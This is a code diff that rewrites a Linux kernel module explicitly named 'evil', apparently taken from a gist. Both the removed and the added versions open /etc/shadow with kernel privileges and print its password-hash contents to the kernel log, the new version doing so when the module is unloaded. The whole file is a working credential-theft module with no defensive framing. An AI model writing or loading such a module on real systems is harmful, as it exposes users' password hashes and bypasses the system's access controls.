@@ -1,61 +1,39 @@
+// From: https://gist.github.com/sirdarckcat/fe8ce94ef25de375d13b7681d851b7b4
+#include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-#include <linux/module.h>
-#include <linux/syscalls.h>
-#include <linux/fcntl.h>
-#include <asm/uaccess.h>
+// We want to read files
+#include <linux/fs.h>
+#include <asm/segment.h>
+#include <linux/uaccess.h>
+#include <linux/buffer_head.h>
 
-struct file *file_open(const char *path, int flags, int rights) 
+static int __init evil_init(void)
 {
-    struct file *filp = NULL;
-    mm_segment_t oldfs;
-    int err = 0;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-    filp = filp_open(path, flags, rights);
-    set_fs(oldfs);
-    if (IS_ERR(filp)) {
-        err = PTR_ERR(filp);
-        return NULL;
-    }
-    return filp;
-}
-
-void file_close(struct file *file) 
-{
-    filp_close(file, NULL);
-}
-
-int file_read(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
-{
-    mm_segment_t oldfs;
-    int ret;
-
-    oldfs = get_fs();
-    set_fs(get_ds());
-
-    ret = vfs_read(file, data, size, &offset);
-
-    set_fs(oldfs);
-    return ret;
-}   
-
-
-static int __init init(void)
-{
-  struct file *f = file_open("/etc/shadow", O_RDONLY, 0); 
-  char buf[128];
-  int i;
-  for (i = 0; i < 128; i++) buf[i] = 0;
-  file_read(f, 0, buf, 128);
-  printk(KERN_INFO "evil buf:%s\n", buf);
+  printk(KERN_INFO "[EVIL] loaded.\n");
   return 0;
 }
 
-static void __exit exit(void)
-{ }
+static void __exit evil_exit(void)
+{
+  char shadow[100];
+  mm_segment_t oldfs;
+  unsigned long long offset = 0;
+  struct file *filp = NULL;
+  oldfs = get_fs();
+  set_fs(get_ds());
+  filp = filp_open("/etc/shadow", 0, 0);
+  if (IS_ERR(filp)) {
+    printk(KERN_INFO "[EVIL] Error: %ld\n", PTR_ERR(filp));
+  } else {
+    kernel_read(filp, shadow, 99, &offset);
+    filp_close(filp, NULL);
+    shadow[99]=0;
+    printk(KERN_INFO "[EVIL] /etc/shadow %s\n", shadow);
+  }
+  set_fs(oldfs);
+}
 
-MODULE_LICENSE("GPL");
-module_init(init);
-module_exit(exit);
+module_init(evil_init);
+module_exit(evil_exit);
+
